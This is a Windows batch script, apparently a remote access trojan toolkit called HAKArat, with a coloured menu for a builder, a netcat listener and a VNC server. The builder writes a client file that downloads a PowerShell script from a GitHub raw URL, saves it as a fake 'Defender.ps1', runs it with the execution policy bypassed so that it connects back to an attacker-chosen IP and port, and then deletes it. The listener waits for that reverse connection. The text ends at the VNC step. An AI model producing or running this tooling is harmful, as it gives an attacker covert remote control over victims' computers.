@echo off
title HAKArat
chcp 65001 >nul
setlocal EnableDelayedExpansion
for /f %%A in ('echo prompt $E ^| cmd') do set "ESC=%%A"
:start
cls
echo.
echo.
echo !ESC![38;2;255;0;0m	██╗  ██╗ █████╗ ██╗  ██╗ █████╗ ██████╗  █████╗ ████████╗	!ESC![0m
echo !ESC![38;2;255;51;0m	██║  ██║██╔══██╗██║ ██╔╝██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝	!ESC![0m
echo !ESC![38;2;255;102;0m	███████║███████║█████╔╝ ███████║██████╔╝███████║   ██║   	!ESC![0m
echo !ESC![38;2;255;153;0m	██╔══██║██╔══██║██╔═██╗ ██╔══██║██╔══██╗██╔══██║   ██║   	!ESC![0m
echo !ESC![38;2;255;204;0m	██║  ██║██║  ██║██║  ██╗██║  ██║██║  ██║██║  ██║   ██║   		!ESC![0m
echo !ESC![38;2;255;255;0m	╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    		!ESC![0m                                                       
echo.
echo !ESC![38;2;255;255;0m 1) Builder !ESC![0m   
echo !ESC![38;2;255;255;0m 2) Listener !ESC![0m   
echo !ESC![38;2;255;255;0m 3) Vnc Server !ESC![0m   
echo !ESC![38;2;255;255;0m 4) Firewall Config !ESC![0m   
echo !ESC![38;2;255;255;0m 5) Exit !ESC![0m   
set /p input=   


if /I "%input%" EQU "1" (
goto builder
)

if /I "%input%" EQU "2" (
goto listener
)

if /I "%input%" EQU "3" (
goto vncserver
)

:builder
cls
echo.
set /p ip=Server IP: 
set /p port=Server Port: 
set name=HAKARatClient
echo @echo off>>%name%.bat
echo powershell (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/LordHAKA/HAKArat/refs/heads/main/ctrl','%appdata%\Defender.ps1')>>%name%.bat
echo powerShell.exe -ExecutionPolicy Bypass -File %appdata%\Defender.ps1 -c %ip% -p %port% -e client.bat>>%name%.bat
echo del %appdata%\Defender.ps1>>%name%.bat
echo HAKA Rat Client Saved in %cd%\%name%.bat!
pause
cls
goto start

exit

:listener
cls
echo.
set /p lisport=Listening Port: 
nc.exe -lvnp "%lisport%"
echo.
echo Connection Closed.
pause
goto start

exit

:vncserver
cd files